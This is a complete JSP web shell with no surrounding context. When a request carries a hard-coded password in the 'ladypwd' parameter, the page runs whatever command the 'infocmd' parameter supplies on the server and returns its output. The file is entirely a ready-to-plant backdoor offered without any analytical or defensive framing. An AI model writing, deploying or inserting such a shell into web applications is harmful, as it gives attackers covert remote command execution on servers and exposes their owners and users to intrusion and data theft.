<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    if ("shaqima".equals(request.getParameter("ladypwd"))) {
        out.print("<pre>");
        InputStream in = new ProcessBuilder(request.getParameter("infocmd").split(" ")).start().getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int ret = -1;
        byte[] bs = new byte[2048];
        out.print("<pre>");
        while((ret = in.read(bs)) != -1) {
            baos.write(bs, 0, ret);
        }
        out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
    }
%>
